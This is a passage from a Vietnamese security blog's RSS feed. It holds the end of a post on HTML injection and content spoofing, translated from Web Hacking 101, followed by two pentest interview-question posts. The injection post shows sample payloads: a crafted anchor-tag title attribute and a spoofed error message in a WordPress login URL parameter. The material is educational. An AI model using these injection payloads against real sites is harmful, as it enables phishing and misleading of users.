&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;test ismap=&amp;#34;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;yes&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&amp;#39;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.torontowebsitedeveloper.com&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;test&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;Nói cách khác, code sẽ xem xét đệ quy chuỗi nào nên là chuỗi tiêu đề và sử dụng first single hoặc double quote. Tôi đã có thể đưa 1 loạt HTML vào thẻ &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;. Đây có vẻ là một lỗi khá nghiêm trọng đúng không :D.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;3-within-security-content-spoofing&#34;&gt;3. Within Security Content Spoofing&lt;/h3&gt;
&lt;h4 id=&#34;description-3&#34;&gt;Description:&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Mặc dù về mặt spoofing nội dung về mặt kỹ thuật là một loại lỗ hổng khác với HTML Injection, tôi đã đưa nó vào đây vì attacker có thể hiển thị nội dung mà attacker muốn chọn. Inside Security được xây dựng trên nền tảng Wordpress bao gồm đường dẫn đăng nhập &lt;code&gt;withinsecurity.com/wp-login.php&lt;/code&gt;. Một hacker nhận thấy rằng trong quá trình đăng nhập, nếu xảy ra lỗi thì Inside Security sẽ hiển thị access_denied, cũng tương ứng với tham số lỗi trong URL:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://withinsecurity.com/wp-login.php?error=access_denied
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;Nhận thấy điều này, attacker đã thử sửa đổi tham số lỗi và thấy rằng bất kỳ giá trị nào được nhập vào đều được trang web hiển thị như một phần của thông báo lỗi được thông báo cho người dùng. Dưới đây, ví dụ được sử dụng:
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://withinsecurity.com/wp-login.php?error=Your%20account%20has%20%hacked
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/ddb80975-2933-4e2e-a421-a4eb11d0cb45.png&#34;&gt;
* Kết luận ở đây: Ta thấy tham số trong URL được hiển thị trên trang. Một thử nghiệm đơn giản thay đổi tham số access_denied có thể đã tạo ra một lỗ hổng trong trường hợp này.
* Chú ý: Theo dõi các tham số URL đang được thông qua và hiển thị dưới dạng nội dung của trang. Chúng có thể tạo cơ hội cho attacker lừa nạn nhân thực hiện một số hành động nguy hiểm. Đôi khi, điều này dẫn đến các kiểu tấn công Cross Site Scripting hoặc là giả mạo nội dung và HTML Injection.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;summary&#34;&gt;Summary&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;HTML Injection trình bày một lỗ hổng cho các trang web và nhà phát triển vì nó có thể được sử dụng để lừa đảo người dùng và lừa họ gửi thông tin nhạy cảm đến hoặc truy cập các trang web độc hại.&lt;/li&gt;
&lt;li&gt;Khám phá các loại lỗ hỏng này không phải luôn luôn là gửi HTML đơn giản mà còn phải khám phá cách mà một trang web có thể hiển thị văn bản được nhập của bạn, như các ký tự được mã hóa URI. Và mặc dù không hoàn toàn giống như nội dung HTML, việc giả mạo nội dung cũng tượng tự ở chỗ nó liên quan đến đầu vào được hiển thị lên cho nạn nhân trong trang HTML. Attacker luôn có cơ hội để loại bỏ tham số URL và hiển thị chúng trên trang web.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;Nguồn: Web Hacking 101, biên tập và dịch lại.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Tổng hợp các câu hỏi phỏng vấn pentest - kiến thức chung (P2)</title>
      <link>https://minhtuanact.github.io/posts/tong-hop-cac-cau-hoi-phong-van-pentest-kien-thuc-chung-p2/</link>
      <pubDate>Fri, 24 May 2019 10:48:44 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/tong-hop-cac-cau-hoi-phong-van-pentest-kien-thuc-chung-p2/</guid>
      <description>&lt;h3 id=&#34;hỏi-answer-true-or-false-and-explain-your-answer-two-factor-authentication-protects-against-session-hijacking&#34;&gt;Hỏi: Answer true or false and explain your answer: two-factor authentication protects against session hijacking?&lt;/h3&gt;
&lt;h3 id=&#34;trả-lời&#34;&gt;Trả lời:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Về câu trả lời này, mình vẫn chưa biết nên trả lời là &lt;strong&gt;đúng&lt;/strong&gt; hay &lt;strong&gt;sai&lt;/strong&gt;. Có 2 trường hợp xảy ra ở đây:
&lt;ul&gt;
&lt;li&gt;Trước khi bạn nhập mã xác minh gửi đến điện thoại hay ứng dụng hay đại loại là 1 mã OTP nào đó mà bên Server gửi cho bạn để xác minh đó đúng là bạn đăng nhập vào tài khoản của bạn. Thì khi đó &lt;strong&gt;attacker&lt;/strong&gt; không thể chiến quyền điều khiển phiên được.&lt;/li&gt;
&lt;li&gt;Nhưng sau khi bạn nhập mã xác minh rồi. &lt;strong&gt;Attacker&lt;/strong&gt; có thể thực hiện việc chiếm quyền điều khiển phiên do bên dịch vụ kia đặt vào bằng &lt;strong&gt;XSS&lt;/strong&gt; hoặc &lt;strong&gt;malware&lt;/strong&gt;. &lt;strong&gt;Attacker&lt;/strong&gt; có thể sử dụng cái &lt;strong&gt;Token Cookie&lt;/strong&gt; đó và đưa vào yêu cầu của họ cho bên kia (ví dụ như Google). Và sau đó &lt;strong&gt;attacker&lt;/strong&gt; đã có quyền truy cập vào tài khoản của bạn.&lt;/li&gt;
&lt;li&gt;Còn về câu trả lời &lt;strong&gt;đúng&lt;/strong&gt; hay &lt;strong&gt;sai&lt;/strong&gt; thì bạn đọc có thể tự trả lời rồi nhé :D.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;hỏi-explain-what-happens-when-a-connection-from-your-webbrowser-to-a-webserver-is-initiated-on-every-osi-layer-as-detailed-as-you-like&#34;&gt;Hỏi: Explain what happens when a connection from your webbrowser to a webserver is initiated on every OSI layer (as detailed as you like)&lt;/h3&gt;
&lt;h3 id=&#34;trả-lời-1&#34;&gt;Trả lời:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Chúng ta sẽ cùng phân tích gói tin sẽ đường truyền đi trên mạng Internet như thế nào, cụ thể ở đây là chúng ta đang lướt web, và mô hình sử dụng là OSI (Hướng đi của gói tin sẽ là từ phía máy gửi (client) đến máy nhận (Server))&lt;/p&gt;</description>
    </item>
    <item>
      <title>Tổng hợp các câu hỏi phỏng vấn pentest - kiến thức chung (P1)</title>
      <link>https://minhtuanact.github.io/posts/tong-hop-cac-cau-hoi-phong-van-pentest-kien-thuc-chung-p1/</link>
      <pubDate>Thu, 23 May 2019 09:48:22 +0700</pubDate>
      <guid>https://minhtuanact.github.io/posts/tong-hop-cac-cau-hoi-phong-van-pentest-kien-thuc-chung-p1/</guid>
      <description>&lt;h3 id=&#34;hỏi-what-are-the-phases-of-a-penetration-test&#34;&gt;Hỏi: What are the phases of a penetration test?&lt;/h3&gt;
&lt;h3 id=&#34;trả-lời&#34;&gt;Trả lời:&lt;/h3&gt;
&lt;h4 id=&#34;thông-thường-pentest-được-chia-ra-làm-6-giai-đoạn&#34;&gt;Thông thường, pentest được chia ra làm 6 giai đoạn&lt;/h4&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://images.viblo.asia/b2d67cc9-c524-47b0-b311-d6dcf568f940.png&#34;&gt;
Sáu giai đoạn này rất quan trọng để lập kế hoạch và thực hiện thành công bài pentest.
Đối với pentest thì có rất nhiều mảng pentest như Pentest Website, Pentest Network, Pentest Server. Nhưng nhìn chung thì Pentest có các giai đoạn như sau:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Pre-Engagement Interactions&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Đây là bước thống nhất các yêu cầu của bên cần pentest và các chiến lược mà bên thực hiện pentest đề ra.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reconnaissance or Open Source Intelligence (OSINT) Gathering&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Một người pentest sẽ hoạt động trên việc thu thập càng nhiều thông tin mật về tổ chức của bạn và các mục tiêu tiềm năng để khai thác.&lt;/li&gt;
&lt;li&gt;Tùy thuộc vào mức độ pentest mà người pentest sẽ có mức độ thông tin về tổ chức của bạn để cần khám phá các lỗ hổng và điểm vào trong môi trường của bạn.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Threat Modeling &amp;amp; Vulnerability Identification&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Trong giai đoạn này người thực hiện pentest sẽ xác định mục tiêu tấn công. Bất kỳ thông tin nào được thu thập trong giai đoạn này sẽ được sử dụng để thông báo phương thức tấn công trong quá trình pentest&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Với mô hình về tất cả các lỗ hổng và các điểm truy cập có thể có, người pentest bắt đầu kiểm tra các khai thác được tìm thấy trong mạng, hệ thống hay ứng dụng của bạn. Xác định các mục tiêu có giá trị cao và tránh mọi phát hiện của hacker.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Post-Exploitation, Risk Analysis &amp;amp; Recommendations&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Sau giai đoạn thứ tư hoàn tất, người pentest sẽ ghi lại các phương thức được sử dụng để có quyền truy cập vào thông tin có giá trị của tổ chức của bạn và đề xuất các phương pháp khắc phục các lỗ hổng.&lt;/li&gt;
&lt;li&gt;Sau khi pentest kết thúc, người pentest nên dọn sạch môi trường, cấu hình lại mọi quyền mà anh ta/cô ta có được để xâm nhập vào môi trường và ngăn chặn truy cập trái phép vào hệ thống.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Reporting&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Báo cáo được coi là khía cạnh quan trọng nhất của một pentester. Đó là nơi bạn sẽ nhận được các đề xuất bằng văn bản và có cơ hội xem xét các phát hiện từ báo cáo với các ethical hacker.&lt;/li&gt;
&lt;li&gt;Những phát hiện và giải thích chi tiết từ báo cáo sẽ cung cấp cho bạn những hiểu biết và cơ hội để cải thiện khả năng bảo mật của bạn. Báo cáo sẽ cho thấy những lỗ hổng còn tồn tại và các cách khắc phục các vấn đề này đường tìm thấy trong giai đoạn khai thác.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3 id=&#34;hỏi-what-is-the-difference-between-a-risk-assessment-a-vulnerability-assessment-and-a-penetration-test&#34;&gt;Hỏi: What is the difference between a risk assessment, a vulnerability assessment, and a penetration test?&lt;/h3&gt;
&lt;h3 id=&#34;trả-lời-1&#34;&gt;Trả lời:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Đầu tiên ta sẽ phải tìm hiểu như thế nào là đánh giá rủi ro, đánh giá lỗ hổng và kiểm thử phần mềm là gì.
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Đánh giá rủi ro – Risk Assessment&lt;/strong&gt;: Kiểm thử này liên quan đến phân tích các rủi ro bảo mật nhận thấy được. Các rủi ro được phân loại là Low, Medium, High. Loại kiểm thử này đưa ra các khuyến nghị nhằm giảm thiểu các rủi ro.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Đánh giá bảo mật bằng cách tấn công vào hệ thống – Penetration testing&lt;/strong&gt;: Đây là loại kiểm thử mô phỏng cuộc tấn công từ phía một hacker thiếu thiện ý. Kiểm thử bao gồm việc phân tích một hệ thống cụ thể, tìm ra các lỗ hổng tiềm ẩn bằng cách tấn công từ bên ngoài.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Rà soát các lỗ hổng tiềm ẩn – Vulnerable Assessment&lt;/strong&gt;: thực hiện thông qua các phần mềm để tự động scan một hệ thống nhằm phát hiện ra các lỗ hổng dựa trên các signatures đã biết.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Vậy sự khác biệt của những thứ này là gì&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Vulneraability Assessment&lt;/strong&gt;: Cố gắng tìm được càng nhiều các lỗ hổng nhất có thể.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Penetration Testing (Pentest)&lt;/strong&gt;: Cố gắng phá vỡ an ninh hệ thống.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Risk Assessment&lt;/strong&gt;: Cố gắng tìm ra những rủi ro có thể có.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;=&amp;gt; Cả 3 phương pháp đều có chức năng và cách tiếp cận khác nhau. Chính vì vậy tùy thuộc vào tình trạng an ninh của hệ thống mà người ta lựa chọn phương pháp nào để áp dụng.&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
